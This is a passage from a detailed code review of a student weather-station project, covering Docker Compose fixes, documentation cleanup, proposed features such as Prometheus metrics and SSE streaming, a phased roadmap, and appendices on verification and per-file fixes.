| D11 | **`update_stress_compose.py` at repo root** | A one-off regex script that mutates *generated* output; `gen_stress_compose.py` already emits `PYTHONUNBUFFERED=1`, so it is a no-op | Delete |
| D12 | **`server` has no memory/CPU limits under the stress profile** | 100 client containers can starve the host | Add `deploy.resources.limits` |

### The elegant fix for D4/D5 — scale via hostname, not generated YAML

Instead of generating 100 service blocks, derive the station ID from the container hostname. Docker sets `HOSTNAME` to the container ID, which is unique per replica:

```python
# station_client/client.py
station_id = (
    args.station_id
    or os.getenv("WEATHER_STATION_ID")
    or os.getenv("HOSTNAME")
    or socket.gethostname()
)
```

```yaml
# docker-compose.stress.yml — 6 lines instead of 2,082
x-station: &station
  build: ./station_client
  environment:
    WEATHER_STATION_HOST: server
    WEATHER_STATION_BATCH_INTERVAL: "1"
    WEATHER_STATION_BATCH_MAX: "5"
  depends_on:
    server: { condition: service_healthy }
  networks: [weather-network]

services:
  server: { … }
  web:    { … }
  station-fleet:
    <<: *station
    deploy: { replicas: 100 }
```

Every replica gets a unique ID automatically, and `docker compose up --scale station-fleet=500` now works. This removes 2,082 lines of committed generated YAML *and* makes the fleet size a runtime parameter instead of a build-time one.

---

## 10. Documentation & repository hygiene

These are the most visible defects on a portfolio and the cheapest to fix.

| # | Issue | Location |
|---|---|---|
| H1 | **Duplicate section numbers.** Two `## 11` (Project Structure, Reliability & Recovery) and two `## 13` (Troubleshooting). Sections 11–16 were appended *after* "Additional Resources" and re-cover material from sections 7–9. | `README.md` |
| H2 | **Four dead links.** `docs/architecture-decisions.md`, `docs/DOCKER.md`, `docs/QUICK_START.md`, `docs/ARCHITECTURE.md` — all actually live in `docs/explanation/`. | `README.md` §"Additional Resources" |
| H3 | **References a non-existent file.** `consumer_client/test_api.py` appears in the Project Structure block and is documented in `docs/explanation/INDEX.md`. The file does not exist. | `README.md` §10, `docs/explanation/INDEX.md` |
| H4 | **Project Structure lists ~8 non-existent files.** | `README.md` §10 |
| H5 | **Encoding damage.** `docs/explanation/INDEX.md` contains `\uFFFD` replacement characters where em-dashes and bullets should be — a corrupted PowerShell redirect. | `docs/explanation/INDEX.md` |
| H6 | **Scratch files in the repository.** `demo.txt` (shell snippets) and `docs/temp_findings.md` (raw log analysis) are working notes, not documentation. | repo root, `docs/` |

### Two more items with outsized impact

**No LICENSE file.** A hard blocker for a public portfolio repository — it prevents reuse and signals that the project is not intended to be shared. Add MIT (or GPL-3.0 if you prefer copyleft).

**Framing.** The README currently reads:

> *"Target Audience: University students (networking, socket programming, Docker, database persistence)"*
> *"Status: Educational project — production deployment not recommended without additional security/observability."*

Reframe around the engineering. The substance is already there; only the packaging is not. Lead with the architecture, the measured numbers, and the test coverage.

---

## 11. Proposed features

### Tier 1 — highest portfolio impact

#### F1 · Prometheus metrics + Grafana dashboard

Expose `GET /metrics` in Prometheus format (~60 lines with `prometheus_client`):

| Metric | Type | Why it matters |
|---|---|---|
| `readings_ingested_total` | counter | Throughput |
| `ingest_latency_seconds` | histogram | p50/p95/p99 write latency |
| `write_queue_depth` | gauge | **Directly evidences the backpressure claim in B7** |
| `write_queue_rejected_total` | counter | Saturation events |
| `active_connections` | gauge | Connection churn |
| `validation_errors_total{reason}` | counter | Which validation rules actually fire in practice |
| `rows_written_total` | counter | Database throughput |
| `consumer_requests_total{type}` | counter | Read-path usage |
| `client_buffer_drops_total` | counter | Silent data loss made visible |

**Why this is first.** It converts every architectural claim in `architecture-decisions.md` from an assertion into a measurement. When a reviewer asks "how do you know the single-writer design performs?", the answer becomes a Grafana screenshot instead of a paragraph. Combined with B7, queue depth turns documented-but-false backpressure into real, observable backpressure.

---

#### F2 · A real load test with published numbers

The current stress test runs 100 containers and hopes. Replace with `scripts/bench.py` that reports:

- Sustained throughput (readings/s) at 10 / 50 / 100 / 250 stations
- Latency percentiles (p50, p95, p99)
- Error and rejection rates
- Queue depth saturation point
- **Before/after comparison** for the index and single-writer changes

Publish the result table in the README. Numbers are more persuasive than adjectives, and a measured 1,500× query improvement is a far stronger artefact than a paragraph describing it.

---

#### F3 · Server-side downsampling and retention

Add a rollup table and a retention job:

```sql
CREATE TABLE readings_1m (
    station_id TEXT, bucket_ms INTEGER,
    temp_avg REAL, temp_min REAL, temp_max REAL,
    hum_avg  REAL, hum_min  REAL, hum_max  REAL,
    wind_avg REAL, wind_min REAL, wind_max REAL,
    n INTEGER,
    PRIMARY KEY (station_id, bucket_ms)
);
```

- Incremental rollup via `INSERT ... ON CONFLICT DO UPDATE` on a timer
- Raw retention window (e.g. 24 h) with older data served from rollups
- Turns 6h/24h queries into O(1) and makes 7d/30d possible (P8)
- Demonstrates time-series engineering: time bucketing, upsert semantics, tiered storage

This is what distinguishes a time-series ingestion project from a CRUD application.

---

#### F4 · Automated test suite + CI + coverage badge

See [§8](#8-testing--ci--the-biggest-gap). The single largest change in perceived quality per hour of work.

---

#### F5 · SSE live streaming

`GET /api/stream` using `text/event-stream`, pushing new readings to the browser.

The dashboard subtitle already claims *"Real-time weather monitoring"*, but the page has **no polling and no streaming** — it only refreshes on user interaction. SSE with Flask is roughly 30 lines and makes the demo genuinely live.

```python
@app.get("/api/stream")
def stream():
    def events():
        last = 0
        while True:
            rows = fetch_since(last)
            if rows:
                yield f"data: {json.dumps(rows)}\n\n"
                last = rows[-1]["id"]
            time.sleep(1)
    return Response(events(), mimetype="text/event-stream")
```

Pair with a `{{ msg_id }}` resume token so a reconnect does not miss readings.

---

#### F6 · Exactly-once ingest with sequence numbers

Add a per-station monotonic `seq`, and a uniqueness constraint:

```sql
seq INTEGER NOT NULL,
UNIQUE(station_id, seq)
```

Server response:

```json
{"status": "ok", "inserted": 2, "seq": 148}
```

Client behaviour:

```json
{"request": "since", "station_id": "STATION-001", "seq": 145}
```

This delivers four things at once:

1. **Fixes B11** — `INSERT OR IGNORE` makes retries genuinely idempotent
2. **Gap detection** — the client knows if it lost batches 146–147
3. **Replay** — a downstream consumer can resume from an exact position
4. **Buffer overflow becomes detectable** — no longer silent data loss

This is the most "real distributed system" feature available to the project, and it closes a bug at the same time. It also makes the sequence numbers in the architecture document (`architecture-decisions.md:857`, listed as a *future* idea) an actual implemented feature.

---

#### F7 · Anomaly detection and alerting

- Rolling z-score per station and metric over a sliding window
- Flag readings beyond ±3σ
- `readings_anomalies` table plus a live badge in the dashboard
- Optional webhook/console alert

Turns the dashboard from a plotter into an instrument that *reports*. A reviewer will spend far longer on the dashboard than on the server code.

---

### Tier 2 — strong supporting features

| # | Feature | Value |
|---|---|---|
| F8 | **Map view** — add `latitude`/`longitude` to the protocol and station metadata; render with Leaflet | The most visually impressive single addition for a README |
| F9 | **Read/write connection strategy** — bounded read pool for consumer traffic | Closes B9; the write/read asymmetry is worth documenting explicitly |
| F10 | **On-disk client spool** — replace the in-memory `deque` with a local SQLite spool, flushed on SIGTERM | Closes B10 and B14g. Buffer survives container restarts — what a real field device does |
| F11 | **OpenAPI spec + versioned API** — `/api/v1/…`, generated spec, contract tests | Signals API-design maturity; ~2 h of work |
| F12 | **Real health and readiness endpoints** — `{"request":"health"}` on TCP (B14b) plus `/healthz` and `/readyz` on HTTP | Removes log noise, gives real liveness *and* readiness signals, and exposes queue depth as a readiness gate |
| F13 | **Frontend polish** — auto-refresh/SSE, unit conversion (°C/°F, m/s→km/h), multi-station comparison overlay, CSV/JSON export, dark mode, vendored Chart.js, LTTB client-side downsampling, keyboard and ARIA accessibility | Turns a functional dashboard into a finished product |
| F14 | **Schema migrations** — `schema_version` table plus ordered migration scripts | `CREATE TABLE IF NOT EXISTS` is a dead end the moment a column is added. Also lets C9 (`detect_wind_column`) be deleted outright |
| F15 | **Graceful connection shutdown** — on SIGTERM, stop accepting, then notify and close each producer so clients flush their buffers | Prevents mid-batch data loss on deploy; pairs with D7 |

---

## 12. Prioritised roadmap

### Phase 1 — Correctness · ~1 day

Fix the bugs that produce wrong output or leave data unprotected.

- [ ] B1 Stored XSS — `new Option()` / `textContent` + `station_id` charset constraint *(🔴)*
- [ ] B2 "Last N values" returns oldest N + push filtering into SQL
- [ ] B3 UTC cutoff in both endpoints
- [ ] B4 Add `idx_readings_station_ts`
- [ ] B6 Tighten `validate_timestamp`; add numeric `ts_ms` sort key
- [ ] B7 `maxsize` on `write_queue` + saturation metric
- [ ] B8 Timeout on `enqueue_batch`
- [ ] B12 `condition: service_healthy` for `web`; read-only DB URI
- [ ] B14a `except (KeyboardInterrupt, asyncio.CancelledError)`
- [ ] B14d `TCP_NODELAY`

**Two of these are the highest ratio of value to effort in the entire review:** B2 + B4 together are roughly five lines and turn "returns the wrong data, slowly" into "returns the right data, instantly."

### Phase 2 — Make it provable · ~2 days

Convert every claim in the architecture document from assertion into evidence.

- [ ] `pytest` suite: `protocol.py` unit tests (~45 cases), integration tests, web regression tests for B2 and B3
- [ ] `pyproject.toml` with shared ruff / mypy / pytest config
- [ ] Type hints across all three services (C5)
- [ ] GitHub Actions: ruff + mypy + pytest matrix on 3.11/3.12/3.13
- [ ] Coverage badge in the README
- [ ] `LICENSE` (MIT)
- [ ] README rewrite: fix duplicate sections (H1), dead links (H2), missing files (H3, H4), reframe for portfolio

### Phase 3 — Make it measurable · ~2 days

- [ ] F1 Prometheus `/metrics` + Grafana dashboard
- [ ] F2 `scripts/bench.py` with published before/after numbers
- [ ] F3 Rollup tables + retention job
- [ ] F5 SSE live streaming
- [ ] F4 test coverage of the new code paths

### Phase 4 — Make it complete · ~2 days

- [ ] F6 `seq` + `UNIQUE(station_id, seq)` idempotency
- [ ] F10 On-disk client spool + SIGTERM flush
- [ ] F12 Health/readiness endpoints wired into compose
- [ ] DevOps: D1–D12 (delete `version:`, add `name:`, separate volumes, delete `docker-compose.stress.yml` and adopt the hostname-scaling trick, `.dockerignore`, `stop_grace_period`, log rotation, non-root users, `gunicorn`, delete `update_stress_compose.py`)
- [ ] Code quality: C1–C4, C6, C8–C10
- [ ] F7 anomaly badges · F8 map view · F13 frontend polish
- [ ] Delete `demo.txt` and `docs/temp_findings.md`; regenerate `docs/explanation/INDEX.md` (H5)

### Effort summary

| Phase | Focus | Est. effort | Effect |
|---|---|---|---|
| 1 | Correctness | 1 day | No more wrong data |
| 2 | Provability | 2 days | Claims become evidence |
| 3 | Measurability | 2 days | Architecture becomes demonstrable |
| 4 | Completeness | 2 days | Product becomes finished |

**Total: ~7 days** to convert a strong coursework project into a defensible portfolio piece.

---

## Appendix A — verification methodology

Findings in §4 were reproduced in isolated Python harnesses rather than inferred from reading. Each harness imported or faithfully re-implemented the relevant code path against a temporary SQLite database.

| # | Test | Result |
|---|---|---|
| 1 | `datetime.fromisoformat` acceptance across 6 timestamp formats | Confirmed B6 — 3 of 6 malformed formats accepted |
| 2 | Naive-local vs naive-UTC cutoff comparison | Confirmed B3 — +3.00 h skew on this host |
| 3 | Faithful reimplementation of `api_readings` limit branch | Confirmed B2 — returns `0,1,2` instead of `7,8,9` |
| 4 | `EXPLAIN QUERY PLAN` + timing, 200k and 300k rows | Confirmed B4/B5 — `SCAN readings`, 207 ms → 0.14 ms |
| 5 | Lexicographic vs true-UTC ordering with mixed offsets | Confirmed B6(b) — ordering incorrect |
| 6 | WAL database opened read-only with live `-wal`/`-shm` | **Not reproduced** — read succeeded; see note below |
| 7 | Duplicate insert of an identical measurement | Confirmed B11 — 2 rows for 1 measurement |

**Note on test 6.** I hypothesised that mounting the volume read-only (`:ro` at `docker-compose.yml:109`) would break the web container, because a WAL database normally needs write access to its `-shm` file. This was **not** reproduced: SQLite successfully opened the database read-only when the `-wal` and `-shm` files already existed and were readable. The failure mode is narrower than I assumed — it requires SQLite to *create* the `-shm` file, which happens on a fresh volume before the server's first checkpoint. I have therefore **not** listed this as a bug. The related finding that *is* real is B12: the web service can start before the database exists, and `sqlite3.connect` then creates an empty file rather than reporting a missing one.

**Verification gaps.** Findings B7, B8, B9, B10 and B14b–k were identified by code inspection and protocol/protocol-layer reasoning rather than dynamic reproduction, as they require sustained multi-process load or timing-sensitive conditions. They are reported as defects on the basis of the code paths, not on measured runtime behaviour, and are ordered accordingly.

---

## Appendix B — file inventory

| File | Lines | Role | Assessment |
|---|---:|---|---|
| `server/app.py` | 447 | TCP server, writer task, consumer handler | Core logic; needs C1, C2, C6 refactoring |
| `server/protocol.py` | 133 | Validation and constants | Pure, clean, **entirely untested** |
| `station_client/client.py` | 430 | Sensor simulation, resilience loop | Sound design; B10, B14g, B14h |
| `web/web.py` | 304 | Flask API | B2, B3, B5 critical; needs C4 |
| `web/static/app.js` | 346 | Dashboard frontend | B1 XSS; no live updates |
| `web/static/styles.css` | 174 | Dashboard styles | Fine; no dark mode |
| `web/templates/index.html` | 99 | Dashboard markup | Fine; needs accessibility and CDN removal |
| `consumer_client/test_consumer.py` | 210 | Manual protocol smoke test | Useful; not CI-runnable |
| `scripts/gen_stress_compose.py` | 185 | Stress compose generator | Superseded by the hostname-scaling approach (D4) |
| `docker-compose.yml` | 120 | Main stack | D1, D2, D3, D8, D9, D12 |
| `docker-compose.stress.yml` | 2,082 | Generated stress stack | **Delete** — see D4 |
| `update_stress_compose.py` | 14 | One-off regex patch | **Delete** — see D11 |
| `README.md` | 579 | Primary documentation | H1–H4, H6 |
| `docs/explanation/architecture-decisions.md` | 894 | Design rationale | Excellent substance; contains two claims disproved above (B7, B11) |
| `docs/explanation/*.md` (16 files) | — | Per-file generated explanations | Clutter; H5 |
| `docs/*.pdf`, `.docx`, `.pptx` | — | Report and presentation | Consider `docs/report/`; check repository size |
| `demo.txt`, `docs/temp_findings.md` | 71, 91 | Scratch notes | **Delete** — H6 |
| **Missing** | — | `consumer_client/test_api.py` | Referenced in 2 places, does not exist (H3) |
| **Missing** | — | `LICENSE`, `.dockerignore`, `pyproject.toml`, CI workflow, any test file | See §8, §9 |

---

## Appendix C — quick reference: fixes by file

### `server/app.py`

| Fix | Refs |
|---|---|
| Add `idx_readings_station_ts` in `init_database()` | B4 |
| `asyncio.Queue(maxsize=QUEUE_MAXSIZE)` | B7 |
| `asyncio.wait_for(result_future, timeout=WRITE_ACK_TIMEOUT)` | B8 |
| Bounded read pool + semaphore instead of per-request connections | B9 |
| `except (KeyboardInterrupt, asyncio.CancelledError)` | B14a |
| `sock.setsockopt(TCP_NODELAY, 1)` | B14d |
| `asyncio.wait_for(reader.readline(), CONN_IDLE_TIMEOUT)` | B14e |
| `UNIQUE(station_id, seq)` + `INSERT OR IGNORE` + `NOT NULL`/`CHECK` constraints | B11, F6, B14i |
| Drop `AUTOINCREMENT` | B14j |
| Return `{"code","trace_id"}` instead of `str(e)` | B13 |
| `class WeatherServer`; extract `_insert_batch()` | C1, C2 |
| `logging` with `QueueHandler` instead of `print` | C6, P3 |
| Implement `{"request":"health"}` | B14b, F12 |
| Graceful producer notification on shutdown | F15 |

### `server/protocol.py`

| Fix | Refs |
|---|---|
| Require timezone-aware ISO-8601; reject date-only and basic formats | B6 |
| Table-driven `RANGES` loop replacing 90 lines | C3 |
| `^[A-Za-z0-9_-]{1,64}$` constraint on `station_id` | B1 |
| Add `seq` to required fields and validation | F6 |
| Optional `latitude`/`longitude` with range validation | F8 |

### `web/web.py`

| Fix | Refs |
|---|---|
| `ORDER BY timestamp DESC LIMIT ?` then reverse | B2 |
| `datetime.now(timezone.utc)` for cutoffs; stop stripping tzinfo | B3 |
| Push `WHERE timestamp >= ?` and `LIMIT` into SQL | B5 |
| Table-driven `RANGES` mirroring `protocol.py` | C4 |
| Extract shared `_query_series()` helper | C4 |
| `contextlib.closing()` for all connections | B14f |
| `condition: service_healthy` on `web`; `mode=ro` DB URI | B12 |
| Replace `parse_timestamp` float fallback | C8 |
| Delete `detect_wind_column()` and `_wind_column_cache` after migrations | C9, C10 |
| Add `1h` / `7d` / `30d` ranges (needs F3) | P8 |
| `Cache-Control` headers | P7 |
| `gunicorn` entrypoint | P6, D10 |
| `/api/stream` (SSE), `/healthz`, `/readyz`, CSV export | F5, F12, F13 |
| Type hints | C5 |

### `station_client/client.py`

| Fix | Refs |
|---|---|
| Count records, not batches, against the buffer cap | B10 |
| `asyncio.Event` for prompt shutdown + SIGTERM buffer flush | B14g |
| Decouple batch generation from the backoff loop | B14h |
| Default `station_id` to `HOSTNAME` (enables `--scale`) | D4 |
| On-disk SQLite spool instead of the in-memory `deque` | F10 |
| Emit `seq` and use `INSERT OR IGNORE` semantics | F6 |
| `TCP_NODELAY` | B14d |
| Wire up or remove `WEATHER_STATION_MAX_RETRIES` | B14c |
| Emit buffer-drop and reconnect metrics | F1 |

### `web/static/app.js`

| Fix | Refs |
|---|---|
| `new Option(s, s)` / `textContent` — never `innerHTML` with data | B1 |
| SSE subscription + graceful reconnect | F5 |
| Unit conversion, multi-station overlay, export, dark mode | F13 |
| LTTB downsampling for large series | F13 |
| ARIA labels, keyboard navigation | F13 |

### Docker & Compose

| Fix | Refs |
|---|---|
| Delete `version:` | D1 |
| Add `name:` per stack; separate volume names | D2, D3 |
| Delete `docker-compose.stress.yml`; adopt hostname scaling | D4, D5 |
| Remove `container_name` | D5 |
| `.dockerignore` per service | D6 |
| `stop_grace_period: 20s` | D7 |
| Log rotation `max-size: 10m, max-file: 3` | D8 |
| `read_only`, `cap_drop: [ALL]`, `no-new-privileges`, `mem_limit`, `cpus` | D9, D12 |
| `gunicorn` for the web image | D10 |
| `USER app` in all three Dockerfiles | S7 |
| Real healthcheck via `{"request":"health"}` | B14b, F12 |
| Delete `update_stress_compose.py` | D11 |

### Repository

| Fix | Refs |
|---|---|
| Add `LICENSE` (MIT) | §10 |
| Add GitHub Actions CI + coverage badge | F4 |
| Add `pyproject.toml` with shared tooling config | C11 |
| Fix duplicate sections, dead links, missing files, framing | H1–H4, H6 |
| Regenerate `docs/explanation/INDEX.md` | H5 |
| Delete `demo.txt`, `docs/temp_findings.md` | H6 |
| Update `architecture-decisions.md` — the backpressure (B7) and idempotency (B11) claims are currently incorrect | B7, B11 |

---

*End of report.*
